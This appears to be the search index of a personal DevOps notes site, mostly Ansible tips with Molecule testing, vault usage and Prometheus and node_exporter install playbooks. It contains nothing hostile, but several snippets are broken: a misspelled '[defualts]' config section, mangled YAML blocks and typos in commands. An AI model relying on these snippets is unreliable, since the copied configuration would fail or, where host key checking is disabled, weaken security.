<code>/etc/ansible/facts.d</code> on the managed nodes<ul> <li>The file has tave to have .fact extentsion - Has to be in the Json Format or .ini</li> <li>Theare stored in <code>ansible_facts[\u2019ansible_local\u2019]</code></li> </ul> </li> </ul>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#managing-software-and-repos","title":"Managing Software  and repos","text":"<p>U can provide a list to the package argument instead of looping over the packages</p>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#downloading-the-local-repo","title":"Downloading the local repo","text":"<p>Ansible doesn't provide the module for creating the repos u have to do it manually</p> <p>Also there's a <code>rmp_key</code> module for downloading  the gpg keys <pre><code># Example downloading and creating a local repo\n- name: make directory\nfile:\npath: /var/ftp/repo\nstate: directory\n- name: download packages\nyum:\nname: nmap\ndownload_only: yes\ndownload_dir: /var/ftp/repo\n- name: createrepo\ncommand: createrepo /var/ftp/repo\n</code></pre></p>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#managing-subscriptions","title":"Managing subscriptions","text":"<p>There are two models that deal with the subscription management</p> <ul> <li><code>red hat_subscription</code> Subscription and Registration in one task</li> <li><code>rhsm_repository</code> add subscription manager repos</li> </ul> <p>Example Using subscription manager to set up Ansible <pre><code>---\n- name: register and subscribe ansible5\nredhat_subscription:\nusername: bob@example.com\npassword: verysecretpassword\nstate: present\n- name: configure additional repo access\n  rhsm_repository:\n- name:\n  - rh-gluster-3-client-for-rhel-8-x86_64-\n  rpms\n    - rhel-8-for-x86_64-appstream-debug-rpms\n</code></pre></p>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#commands","title":"Commands","text":"<p>Docs</p>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#defining-targets","title":"Defining Targets","text":"<p>You can also specify multiple hosts and groups by separating them with colons:</p> <pre><code># Exmaple  Test Host connection\nansible server1:server2:dbservers -i inventory -m ping\nansible all -i inventory -m ping\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#runing-modules","title":"Runing modules","text":"<ul> <li>Probably u will need to use the setup module<ul> <li>Docs</li> </ul> </li> <li>To execute a module with arguments, include the -a flag followed     by the appropriate options in double quotes<ul> <li>U can use whatever the cmd with -a</li> </ul> </li> </ul> <pre><code>ansible -i hosts servers -m setup -a 'filter: ansible_distribution'\n\nansible servers -i hosts -m file -a 'state: directory'\n\nansible &lt;target group&gt; -i inventory -m module -a \"module options\"\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#setup-module","title":"Setup module","text":"<ul> <li>pages of information about the server that can be used as variable in the playbooks later</li> </ul>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#ansible-debuging","title":"Ansible Debuging","text":"<p>U can skip the deubiging message by using etiher the: *  Verbosity Level in ur playbook  Just use <code>-vvv</code> flag <pre><code># Example running playbok withthe different verbosity  up to 6\nansible-playbook all playboo.yml -vvv\n</code></pre></p> <ul> <li>U can also prettyfie the ansible message in  ansible.cfg</li> </ul>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#useful-modules","title":"Useful modules","text":"<ul> <li>Uri<ul> <li>To perform quick checks and so on</li> </ul> </li> <li>Stat<ul> <li>stat the files and dirs</li> </ul> </li> <li>Assert <pre><code>- name: check if file size is valid\n  assert:\n    that:\n    - \"{{ (filesize | int) &lt;= 100 }}\"\n    - \"{{ (filesize | int) &gt;= 1 }}\"\n    fail_msg: \"file size must be between 0 and\n    100\"\n    success_msg: \"file size is good, let\\\u2019s\n    continue\"\n\n- name: create a file\n  command: dd if=/dev/zero of=/bigfile bs=1\n  count={{ filesize }}\n</code></pre></li> </ul> Name Use command Runs arbitrary commands but not using a shell shell Runs arbitrary commands using a shell raw Runs commands directly on top of SSH without using Python copy Copies files or lines of text to files yum Manages packages on RHEL family-managed hosts service Manages the current state of systemd and system-V services ping Checks whether managed hosts are in a manageable state <pre><code># raw  is used to do it over ssh without the python  so can be used for installing things for ansible\nansible -u root -i inventory ansible3 --ask-pass -m raw -a \u201cyuminstall python3\"\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#execution-modes","title":"Execution Modes","text":"","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#check-mode","title":"Check Mode","text":"<p>Some modules don't support the check mode <code>check_mode: yes</code> yes can be used with any task it also overwrites the entire playbook</p>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#diff-mode-diff","title":"Diff mode --diff","text":"<p>Display changes in file contents <pre><code>ansible-playbook playbook.yml --diff\n\n#  Output:\n# --- before: /etc/myconfig.conf\n# +++ after: /etc/myconfig.conf\n# @@ -1,3 +1,3 @@\n#  setting1 = true\n# -setting2 = old_value\n# +setting2 = new_value\n#  setting3 = enabled\n</code></pre></p>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#mange-task-tags-and-list-task","title":"Mange task tags and list task","text":"","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#list-the-task","title":"List the task","text":"<pre><code>ansible     --list-task &lt;playbook&gt;\nansible     --list-task &lt;playbook&gt;\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#tags","title":"Tags","text":"<ul> <li>U can list tags with just --list-tags</li> <li>If u set the tag to <code>never</code> it want run unless specified (useful for debugging)</li> </ul>","tags":["ansible"]},{"location":"docs/ansible/ansible-playbook/#meta-and-flush-handlers","title":"Meta and flush handlers","text":"<ul> <li>Using <code>flush_handlers</code> in this way allows you to control when the handlers are executed.<ul> <li>Instead of waiting until the end of the playbook, you can force them to run at a specific point, which can be useful for ensuring that certain tasks are completed before moving on to the next steps.</li> </ul> </li> </ul> <pre><code>---\n- name: Set up the toy room\n  hosts: localhost\n  tasks:\n    - name: Install shelf\n      apt:\n        name: shelf\n        state: present\n      notify: Clean the room  # Notify the handler to clean the room\n\n    - name: Put toys on the shelf\n      command: echo \"Putting toys on the shelf\"\n\n    - name: Force flush handlers\n      ansible.builtin.meta: flush_handlers  # This forces any notified handlers to run immediately\n\n  handlers:\n    - name: Clean the room\n      command: echo \"Cleaning the room\"\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible.cfg/","title":"Ansible configuration","text":"<ol> <li>ansible.cfg in the current directory</li> <li>ANSIBLE_CONFIG environment var</li> </ol> <pre><code># Provides also current config file in use\nansible --version\n</code></pre> <p>Example ansible.cfg</p> <pre><code>[defualts]\ninventory = ./myInventoru\nremote_user: devovs\ncollections_paths = ./collections/\ncollbacks_enabled: ansible.posix.profile_roles\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible.cfg/#error-message-readability","title":"Error Message Readability","text":"<p>Improve error message readability</p> <pre><code># file: ansible.cfg\n# stdout_callback = debug\n# or\n# stdout_callback = error\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible.cfg/#profiling-tasks-executions","title":"Profiling Tasks Executions","text":"<pre><code># ansible.cfg\n[defaults]\nCALLBACKS_ENABLED=ansible.posix.profile_tasks\n# Output:\n# oTASKS RECAP ***************************************************************************************************************************************************\n# Friday 04 April 2025  01:15:58 +0200 (0:00:00.006)       0:00:00.050 **********\n# ===============================================================================\n# Debug Task 1 ------------------------------------------------------------------------------------------------------------------------------------------- 0.01s\n# Debug Task 2 ------------------------------------------------------------------------------------------------------------------------------------------- 0.01s\n# Debug Task 4 ------------------------------------------------------------------------------------------------------------------------------------------- 0.01s\n# Debug Task 3 ------------------------------------------------------------------------------------------------------------------------------------------- 0.01s\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible_commands/","title":"Ansible Commands","text":"<p>Docs</p>","tags":["ansible"]},{"location":"docs/ansible/ansible_commands/#test-host-connection","title":"Test Host connection","text":"<pre><code>ansible all -i inventory -m ping\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible_commands/#defining-targets","title":"Defining Targets","text":"<p>You can also specify multiple hosts and groups by separating them with colons:</p> <pre><code>ansible server1:server2:dbservers -i inventory -m ping\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible_commands/#runing-modules","title":"Runing modules","text":"<ul> <li>Probably u will need to use the setup module<ul> <li>Docs</li> </ul> </li> <li>To execute a module with arguments, include the -a flag followed     by the appropriate options in double quotes<ul> <li>U can use whatever the cmd with -a</li> </ul> </li> </ul> <p>ansible -i hosts servers -m setup -a \u2018filter: ansible_distribution\u2019 ansible servers -i hosts -m file -a \u2018state: directory path=/opt/deployment\u2019</p> <pre><code>ansible &lt;target group&gt; -i inventory -m module -a \"module options\"\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible_commands/#setup-module","title":"Setup module","text":"<ul> <li>pages of information about the server that can be used as variable     in the playbooks later</li> </ul>","tags":["ansible"]},{"location":"docs/ansible/ansible_commands/#run-as-root","title":"Run as root","text":"<pre><code>ansible server1 -i inventory -a \"tail /var/log/nginx/error.log\" --become\n</code></pre> <p>Ansible Main</p>","tags":["ansible"]},{"location":"docs/ansible/ansible_commands/#ansible-debuging","title":"Ansible Debuging","text":"<p>U can skip the deubiging message by using etiher the: - Verbosity Level in ur playbook - Just use <code>-vvv</code> flag</p>","tags":["ansible"]},{"location":"docs/ansible/ansible_commands/#ansible-roles","title":"Ansible Roles","text":"<p>Init a role</p> <pre><code># role creation\nansible-galaxy init &lt;role_name&gt;\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible_custom_modules/","title":"Custom Ansible Modules","text":"<p>Wirting custom moduels is preety easy all it is to execute the  python and reutrn a json with specyfied keys </p> <p>Then put it to the <code>library diectory</code></p> <p>**Example module  <pre><code>#!/usr/bin/python\n#Rember about to not change the shebang line !!! \nfrom ansible.module_utils.basic import AnsibleModule\n\ndef runModule():\n    module_args = {\"go_pkg\": {\"type\": \"str\", \"required\": True}}\n\n    module = AnsibleModule(argument_spec=module_args, supports_check_mode=True)\n    params = module.params\n\n    go_pkg: str = params[\"go_pkg\"]\n\n    pkg_name = getPkgName(go_pkg)\n\n    if not isPkgAvailable(\"go\"):\n        module.fail_json(msg=\"Failed to find 'go' on the system\")\n\n    installation_result = go_install(go_pkg)\n\n    failed = installation_result[\"status\"] == \"failed\"\n\n    module.exit_json(changed=not failed, results=installation_result, failed=failed)\n</code></pre></p>"},{"location":"docs/ansible/ansible_jinja2/","title":"Stemping the server","text":"<p>Alot of the times u don't know what has changed on the given server</p> <ul> <li>This gives u ability to see what has change before the previous     configuration</li> </ul>","tags":["ansible"]},{"location":"docs/ansible/ansible_jinja2/#delegating","title":"Delegating","text":"<ul> <li>By defulat the ansible copies the files to all the host<ul> <li>To prevent that use delegate_to local host</li> </ul> </li> </ul>","tags":["ansible"]},{"location":"docs/ansible/ansible_jinja2/#template-module","title":"Template module","text":"<p>Docs</p> <pre><code>- name: use Jinja2 template to configure vsftpd\n      template:\n        src: vsftpd.j2\n        dest: /etc/vsftpd/vsftpd.conf\n</code></pre> <ol> <li> <p>Example Template</p> <pre><code>#[ansible@controller templates]$ cat vsftpd.j2\nanonymous_enable={{ anonymous_enable }}\nlocal_enable={{ local_enable }}\nwrite_enable={{ write_enable }}\nanon_upload_enable={{ anon_upload_enable }}\ndirmessage_enable: YES\nxferlog_enable: YES\nconnect_from_port_20: YES\npam_service_name: vsftpd\nuserlist_enable: YES\n# MY IP Address={{ ansible_facts['default_ipv4']['address'] }}\n</code></pre> </li> </ol>","tags":["ansible"]},{"location":"docs/ansible/ansible_jinja2/#filtering-the-nodes","title":"Filtering the nodes","text":"<ul> <li> <p>Shorter one</p> <pre><code>{{ ansible_play_host_all | select('not in', ansible_play_hosts) | join(', ') }}\n</code></pre> </li> <li> <p>Longer one</p> <pre><code>{% for host in ansible_play_host_all %}\n\n{% if host not in ansible_play_hosts%}\n\n{{host}}\n\n{% endif %}\n\n{% endfor %}\n</code></pre> </li> </ul>","tags":["ansible"]},{"location":"docs/ansible/ansible_libvrd/","title":"Ansible Libvrd","text":"<p>Docs</p> <p>Port forwording of virt-meanger</p> <p>Sharing storage between host and vms</p>"},{"location":"docs/ansible/ansible_molecule/","title":"Molecule","text":"<ul> <li>Use the official example of Molecule\u2014do not use <code>Red Hat's example</code> as it\u2019s outdated.</li> <li>Refer to the Official Guide to Using Podman Containers with Molecule for up-to-date information.</li> <li>For basic setups, you don\u2019t need extra configurations for Podman, as it\u2019s the default behavior in Molecule.</li> <li>All you need is a <code>converge.yml</code> file and the <code>molecule.yml</code> configuration file.</li> </ul>","tags":["ansible"]},{"location":"docs/ansible/ansible_molecule/#plugins-and-installation","title":"Plugins and installation","text":"<p>For now using the vagrant provider will result in error</p> <p>There are plans to remvoe the support for the molecule plugins issue#510 <pre><code># The current work around\npip install --force-reinstall -v 'molecule==25.1.0'\n</code></pre></p> <p>To install plugins use this method  ansible docs</p>","tags":["ansible"]},{"location":"docs/ansible/ansible_molecule/#initialization","title":"Initialization","text":"<p>All you have to do is set up <code>molecule.yml</code>, <code>converge.yml</code>, and <code>verify.yml</code>.</p> <pre><code># Initialize Molecule scenario with the Podman driver\nmolecule init scenario -d podman\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible_molecule/#commands","title":"Commands","text":"<pre><code>\u2514\u2500\u2500 default\n    \u251c\u2500\u2500 dependency   # Installs role dependencies (e.g., via requirements.yml)\n    \u251c\u2500\u2500 cleanup      # Cleans up any leftover artifacts from previous runs\n    \u251c\u2500\u2500 destroy      # Removes any existing test instances\n    \u251c\u2500\u2500 syntax       # Checks the syntax of Ansible playbooks before running them\n    \u251c\u2500\u2500 create       # Creates the test environment (e.g., spins up Docker containers/VMs)\n    \u251c\u2500\u2500 prepare      # Applies additional setup (e.g., provisioning dependencies)\n    \u251c\u2500\u2500 converge     # Runs the actual Ansible playbook to configure the system\n    \u251c\u2500\u2500 idempotence  # Ensures rerunning `converge` produces no changes (idempotency check)\n    \u251c\u2500\u2500 side_effect  # Runs optional extra tasks that don't impact idempotence (e.g., notifications)\n    \u251c\u2500\u2500 verify       # Runs tests to validate the configuration (e.g., using Testinfra)\n    \u251c\u2500\u2500 cleanup      # Cleans up after testing\n    \u2514\u2500\u2500 destroy      # Destroys the test environment (again)\n    ## More efficient one\nscenario:\n  name: default\n  test_sequence:\n    - lint\n    - destroy\n    # - dependency\n    - syntax\n    - create\n    # - prepare\n    - converge\n    - idempotence\n    ## - side_effect\n    - verify\n    - destroy\n</code></pre> <p>Note</p> <ul> <li>Navigate between <code>molecule converge</code> and <code>molecule verify</code>.</li> <li><code>molecule test</code> will execute the full cycle from startup to destroy (but is very verbose).</li> <li>use <code>molecule test  --destroy=never</code> to preserve the container</li> </ul> <pre><code>molecule converge\n# Output:\n# INFO     Running default &gt; prepare\n# WARNING  Skipping, prepare playbook not configured.\n# INFO     Running default &gt; converge\n# INFO     Sanity checks: 'podman'\n\nmolecule verify\n# Output:\n# PLAY RECAP *********************************************************************\n# instance                   : ok=1    changed=0    unreachable=0    failed=0    skipped=1    rescued=0    ignored=0\n# INFO     Verifier completed successfully.\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible_molecule/#custom-flags","title":"Custom Flags","text":"<p><pre><code>molecule test -- --tags=test\n</code></pre> <pre><code>#Exaple passing the passsword file\n\n# ANSIBLE_VAULT_PASSWORD_FILE=$HOME/.vault.txt molecule test\n# or a better way\nprovisioner:\n  name: ansible\n  config_options:\n    defaults:\n      vault_password_file: \"${MOLECULE_SCENARIO_DIRECTORY}/vault.pw\"\n</code></pre></p>","tags":["ansible"]},{"location":"docs/ansible/ansible_molecule/#moleculeyml","title":"Molecule.yml","text":"<p>The deployment configuration Chekcout the possible distros images</p> <ul> <li>Custome Image</li> <li>Podman inside the docker and Podman inside Podman</li> <li>systemd container setup</li> </ul> <pre><code># Standard setup for using Podman in Molecule\n\nrole_name_check: 1\n# to add additional collection to the base node img\ndependency:\n  name: galaxy\n  options:\n    requirements-file: requirements.yml\n    ignore-errors: true\ndriver:\n  name: podman\n  # This is the seutp for the containers with systemd inside them\nplatforms:\n  - name: instance\n    image: \"docker.io/geerlingguy/docker-${MOLECULE_DISTRO:-ubuntu2004}-ansible:${MOLECULE_TAG:-latest}\"\n    command: ${MOLECULE_DOCKER_COMMAND:-\"\"}\n    volumes:\n      - /sys/fs/cgroup:/sys/fs/cgroup:rw\n    cgroupns_mode: host\n    privileged: true\n    pre_build_image: true\n    user: \"rocky\"\nprovisioner:\n  name: ansible\n  playbooks:\n    converge: ${MOLECULE_PLAYBOOK:-converge.yml}\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible_molecule/#convergeyml","title":"Converge.yml","text":"<p>The <code>converge.yml</code> file contains the actual playbook tasks within your Molecule test.</p> <ul> <li>Sections</li> <li><code>pre_tasks</code>: Prepare the container.</li> <li><code>tasks</code>: Main testing tasks.</li> <li><code>post_tasks</code>: Clean-up or post-test steps.</li> </ul> <pre><code>#Example Converge file that imports either playbooks or roles\n- name: Converge\n  hosts: all\n  pre_tasks:\n    - name: Install dependencies\n      package:\n        name: curl\n        state: present\n  tasks:\n    - name: Create a test file\n      file:\n        path: /tmp/molecule_test.txt\n        state: touch\n  post_tasks:\n    - name: Remove test file\n      file:\n        path: /tmp/molecule_test.txt\n        state: absent\n- import_playbook: ../../playbook.yml\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible_molecule/#inventories","title":"Inventories","text":"<pre><code># U can easliy specyfie the host_vars and group_vars\n# also /molecule/defualt/group_vars or host_vars will import it to\nprovisoner:\n  inventory:\n    group_vars:\n      all:\n        containers:\n          - name: adminer\n            image: docker.io/library/adminer:latest\n            ports:\n              - { host: \"8080\", container: \"8080\" }\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible_molecule/#verifyyml","title":"Verify.yml","text":"<p>All it does it's run a playbook to verify the state of the playbook No special role just a playbook <pre><code># Example molecule verify playbook\n- name: Verify\n  hosts: all\n  gather_facts: false\n  vars:\n  # If you want to import vars from the role, you have to either\n  # add it as an empty role (not recommended)\n  # or just use import_vars\n  tasks:\n    # Include vars from role\n    - name: Initialize role without actually running it\n      ansible.builtin.include_role:\n        name: my_role\n        tasks_from: init\n    # Or import them from role\n    - name: Include default vars\n      ansible.builtin.include_vars:\n        dir: \"{{ lookup('env', 'MOLECULE_PROJECT_DIRECTORY') }}/defaults/\"\n        extensions:\n          - yml\n    - name: Check if {{ config }} exists\n      ansible.builtin.stat:\n        path: \"{{ config }}\"\n      register: file_stat\n    - name: Fail if file is missing\n      ansible.builtin.fail:\n        msg: \"{{ config }}\"\n      when: not file_stat.stat.exists\n</code></pre></p>","tags":["ansible"]},{"location":"docs/ansible/ansible_molecule/#delegete-host","title":"Delegete host","text":"<pre><code>---\ndriver:\n  name: delegated  # Avoids creating a local instance\n\nplatforms:\n  - name: backup_server\n    address: 192.168.1.200  # Replace with the actual remote machine IP/hostname\n    user: ansible           # SSH user\n    ssh_port: 22            # SSH port\n    connection: ssh\n    instance_raw_config_args:\n      - \"-o StrictHostKeyChecking=no\"\n</code></pre> <ul> <li>Ansible</li> </ul>","tags":["ansible"]},{"location":"docs/ansible/ansible_vars/","title":"Registers","text":"<p>Capture the output of the play inside the variable</p> <pre><code>- name: Register Playbook\n  hosts: proxy\n  tasks:\n    - name: Run a command\n      command: uptime\n      register: server_uptime\n\n    - name: Inspect the server_uptime variable\n      debug:\n        var: server_uptime\n\n    - name: Show the server uptime\n      debug:\n        msg: \"{{ server_uptime.stdout }}\"\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible_vars/#ansible-special-variables","title":"Ansible special variables","text":"<p>Docs</p> <p>The two most important ones are</p> <ul> <li>ansible playhostall</li> <li>ansible playhost This is holds what nodes where successful</li> </ul>","tags":["ansible"]},{"location":"docs/ansible/ansible_vars/#filtering-the-nodes","title":"Filtering the nodes","text":"<ul> <li> <p>Shorter one</p> <pre><code>{{ ansible_play_host_all | select('not in', ansible_play_hosts) | join(', ') }}\n</code></pre> </li> <li> <p>Longer one</p> <pre><code>{% for host in ansible_play_host_all %}\n\n{% if host not in ansible_play_hosts%}\n\n{{host}}\n\n{% endif %}\n\n{% endfor %}\n</code></pre> </li> </ul> <p>The most important is the <code>--extra-vars</code></p> <pre><code>(for example, -e \"user: my_user\")(always win precedence)\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible_vars/#ansible-variables","title":"Ansible variables","text":"","tags":["ansible"]},{"location":"docs/ansible/ansible_vars/#varialbe-prcencece","title":"Varialbe prcencece","text":"<p>Docs</p>","tags":["ansible"]},{"location":"docs/ansible/ansible_vars/#including-external-variables","title":"Including external variables","text":"<p>Just use var files to import them from the another yml file Keep in mind that vars files loads the variables right at the start of the playbook**.</p>","tags":["ansible"]},{"location":"docs/ansible/ansible_vars/#dynamic-varaibles","title":"Dynamic Varaibles","text":"<p>You can also use the include vars module to dynamically load your variables in your playbook.</p> <pre><code>- name: Working with variables\n  hosts: node1\n  tasks:\n    - name: Load the variables\n      include_vars: myvars.yml\n\n    - name: Show 2nd item in port_nums\n      debug:\n        msg: SSH port is {{ port_nums[1] }}\n</code></pre> <ol> <li> <p>Creating a list dictionaries</p> <p>The variables can be listed in the array</p> <pre><code>vars:\n   port_nums: [21,22,23,25,80,443]\n</code></pre> </li> </ol>","tags":["ansible"]},{"location":"docs/ansible/ansible_vault/","title":"Ansible Vault","text":"","tags":["ansible"]},{"location":"docs/ansible/ansible_vault/#ansible-vault","title":"Ansible Vault","text":"","tags":["ansible"]},{"location":"docs/ansible/ansible_vault/#creating-a-vault","title":"Creating a Vault","text":"<pre><code># Create an encrypted file using Ansible Vault\nansible-vault create &lt;filename&gt;\n</code></pre>","tags":["ansible"]},{"location":"docs/ansible/ansible_vault/#using-a-password-file-with-ansible-vault","title":"Using a Password File with Ansible Vault","text":"<p>If you want to avoid typing in the Vault password every time, you can store it in a password file:</p> <ol> <li> <p>Create a Password File:</p> <p>Note: The file should contain only the password, without any extra characters or newlines.</p> <pre><code>echo 'my_vault_password' &gt; .vault_pass\n</code></pre> </li> <li> <p>Ignore the Password File in Version Control: Add <code>.vault_pass</code>     to your version control\u2019s ignore file (like <code>.gitignore</code>) to prevent     accidental commits.</p> </li> <li> <p>Using the Password File in Your Playbook: When running a     playbook, reference the password file using <code>--vault-password-file</code>:</p> <pre><code>ansible-playbook main.yml -i inventory --vault-password-file=.vault_pass\n</code></pre> </li> </ol> <p>Ansible Vault Documentation.`</p>","tags":["ansible"]},{"location":"docs/ansible/rhel-system-roles/","title":"Rhel-System-Roles","text":"<p>This are the roles provided by the REDHAT for RHEL systems * The RHEL system roles will be installed in the <code>/usr/share/ansible/roles</code> </p> <pre><code>ansible-galaxy install -r req.yml -p ~/.ansible/roles\ncat req.yml\n# Output: \n# - src: linux-system-roles.network\n# - src: linux-system-roles.timesync\n# - src: linux-system-roles.selinux\n# - src: linux-system-roles.firewall\n# - src: linux-system-roles.storage\n# - src: linux-system-roles.kdump\n</code></pre>"},{"location":"docs/ansible/rhel-system-roles/#selinux-role","title":"Selinux role","text":"<p>Therse a <code>selinux_reboot_required</code> if it's set to ture by defualt  * This will reboot the machine and waits for it unless the machine is up again </p> <p>Example playbook <pre><code>- name: execute the role and catch errors\nblock:\n- include_role:\nname: rhel-system-roles.selinux rescue:\n# Fail if failed for a different reason\nthan selinux_reboot_required.\n- name: handle errors\n</code></pre></p>"},{"location":"docs/ansible/rhel-system-roles/#time-sync-role","title":"Time sync role","text":"<ul> <li><code>timesync_ntp_servers</code> variable. This variable specifies attributes to indicate which time servers should be used.</li> <li><code>hostname</code> attribute identifies the name of IP address of the time server. </li> <li><code>iburst</code> option is used to enable or disable fast initial time synchronization using the <code>timesync_ntp_servers</code> variable</li> </ul>"},{"location":"docs/ansible/templates/node_exporter_installation/","title":"Node exporter installation","text":"<pre><code>---\n- name: Install node_exporter\n  hosts: machines\n  become: true  \n  vars:\n    node_exporter_url: \"https://github.com/prometheus/node_exporter/releases/download/v1.8.2/node_exporter-1.8.2.linux-amd64.tar.gz\"\n    node_exporter_tarball: \"{{ node_exporter_url | basename | regex_replace('\\\\.tar\\\\.gz$', '') }}\"\n\n  tasks:\n    - name: Create a group for node_exporter\n      group:\n        name: node_exporter\n        system: true\n      notify: Restart node_exporter\n\n    - name: Make a user for node_exporter\n      user:\n        name: node_exporter\n        shell: /sbin/nologin\n        system: true\n        create_home: no\n        group: node_exporter  \n      notify: Restart node_exporter\n\n    - name: Check if Node Exporter binary exists\n      stat:\n        path: /opt/node_exporter/node_exporter  \n      register: binary\n\n    - name: Unarchive a file that needs to be downloaded \n      unarchive:\n        src: \"{{ node_exporter_url }}\"\n        dest: /opt\n        group: node_exporter\n        owner: node_exporter\n        remote_src: yes\n      when: not binary.stat.exists\n      notify: Download the binnary \n\n    - name: Create a symbolic link to node_exporter\n      file:\n        src: \"/opt/{{ node_exporter_tarball }}\"\n        dest: /opt/node_exporter\n        owner: node_exporter\n        state: link\n      notify: Restart node_exporter\n\n    - name: Firewall set for 9100 to be accessible\n      firewalld:\n        port: 9100/tcp\n        permanent: yes\n        state: enabled\n        immediate: yes\n      failed_when: false\n      ignore_errors: true\n\n    - name: Copy over the service file\n      copy:\n        src: node_exporter.service\n        dest: /etc/systemd/system/node_exporter.service\n      notify: Restart node_exporter\n\n    - name: Create directory for textfile collector\n      file:\n        path: /var/lib/node_exporter/textfile_collector\n        state: directory\n        owner: node_exporter\n        group: node_exporter\n        mode: '0755'\n      notify: Restart node_exporter\n\n    - name: Create sysconfig file for node_exporter\n      file:\n        path: /etc/sysconfig/node_exporter\n        state: file\n        owner: node_exporter\n        group: node_exporter\n        mode: '0644'\n      notify: Restart node_exporter\n\n    - name: Start the node_exporter\n      systemd:\n        name: node_exporter\n        state: started\n        daemon_reload: yes\n        enabled: yes\n      notify: Restart node_exporter\n\n  handlers:\n    - name: Restart node_exporter\n      systemd:\n        name: node_exporter\n        state: restarted\n</code></pre>"},{"location":"docs/ansible/templates/prometheus_installation/","title":"Prometheus installation","text":"<pre><code>---\n- name: Install Prometheus \n  hosts: machines\n  become: true  \n  vars:\n    prometheus_url: \"https://github.com/prometheus/prometheus/releases/download/v2.25.0/prometheus-2.25.0.linux-amd64.tar.gz\"\n    prometheus_tarball: \"{{ prometheus_url | basename | regex_replace('\\\\.tar\\\\.gz$', '') }}\"\n\n  tasks:\n\n    - name: Make a user for Prometheus\n      user:\n        name: prometheus\n        shell: /sbin/nologin\n        system: true\n        create_home: no\n        group: prometheus  \n\n    - name: Create a group for Prometheus\n      group:\n        name: prometheus\n        system: true\n\n    - name: Unarchive a file that needs to be downloaded \n      unarchive:\n        src: \"{{ prometheus_url }}\"\n        dest: /opt\n        group: prometheus\n        owner: prometheus\n        remote_src: yes\n\n    - name: Create a symbolic link to Prometheus\n      file:\n        src: \"/opt/{{ prometheus_tarball }}\"\n        dest: /opt/prometheus\n        owner: prometheus\n        state: link\n\n    - name: Linke the tarball \n      file:\n        src: \"/opt/{{ prometheus_tarball }}\"\n        dest: /opt/prometheus\n        owner: prometheus\n        state: link\n\n    - name: Copy the configuration\n      copy:\n        remote_src: yes\n        src: /opt/prometheus/prometheus.yml \n        dest: /etc/prometheus.yml\n        owner: prometheus\n\n    - name: Firewall set for 9100 to be accessible\n      firewalld:\n        port: 9090/tcp\n        permanent: yes\n        state: enabled\n        immediate: yes\n      failed_when: false\n      ignore_errors: true\n\n    - name: copy over the service file\n      copy:\n          src: prometheus.service\n          dest: /etc/systemd/system/prometheus.service\n\n    - name: Start the prometheus\n      systemd:\n        name: prometheus\n        state: started\n        daemon_reload: yes\n        enabled: yes\n</code></pre>"},{"location":"docs/apache/httpd/","title":"httpd","text":"<p>To locate the appache httpd file use  apachectl</p> <pre><code>apachectl -V | grep -i root\n# Server version: Apache/2.4.62 (Rocky Linux)\n# Server built:   Jan 10 2025 00:00:00\n# Server's Module Magic Number: 20120211:134\n# Server loaded:  APR 1.7.0, APR-UTIL 1.6.1, PCRE 8.44 2020-02-12\n# Compiled using: APR 1.7.0, APR-UTIL 1.6.1, PCRE 8.44 2020-02-12\n# Architecture:   64-bit\n# Server MPM:     event\n#   threaded:     yes (fixed thread count)\n#     forked:     yes (variable process count)\n# Server compiled with....\n#  -D APR_HAS_SENDFILE\n#  -D APR_HAS_MMAP\n#  -D APR_HAVE_IPV6 (IPv4-mapped addresses enabled)\n#  -D APR_USE_PROC_PTHREAD_SERIALIZE\n#  -D APR_USE_PTHREAD_SERIALIZE\n#  -D SINGLE_LISTEN_UNSERIALIZED_ACCEPT\n#  -D APR_HAS_OTHER_CHILD\n#  -D AP_HAVE_RELIABLE_PIPED_LOGS\n#  -D DYNAMIC_MODULE_LIMIT=256\n#  -D HTTPD_ROOT=\"/etc/httpd\"\n#  -D SUEXEC_BIN=\"/usr/sbin/suexec\"\n#  -D DEFAULT_PIDLOG=\"run/httpd.pid\"\n#  -D DEFAULT_SCOREBOARD=\"logs/apache_runtime_status\"\n#  -D DEFAULT_ERRORLOG=\"logs/error_log\"\n#  -D AP_TYPES_CONFIG_FILE=\"conf/mime.types\"\n#  -D SERVER_CONFIG_FILE=\"conf/httpd.conf\"\n</code></pre>"},{"location":"docs/cloud/ELK/elk/","title":"ELK Stack Overview","text":""},{"location":"docs/cloud/ELK/elk/#elastic-stack","title":"Elastic Stack","text":""},{"location":"docs/cloud/ELK/elk/#components","title":"Components","text":"<ul> <li>Elastic Search</li> <li>Distributed JSON-based search and analytics engine</li> <li>Logstash</li> <li>Collects logs, metrics, and other data from different sources</li> <li>Processes data (filtering, parsing)</li> <li>Outputs to various destinations</li> <li>Kibana</li> <li>Creates data visualizations and dashboards</li> </ul>"},{"location":"docs/cloud/ELK/elk/#elastic-search","title":"Elastic Search","text":""},{"location":"docs/cloud/ELK/elk/#structure","title":"Structure","text":"<p>Docs</p> <ul> 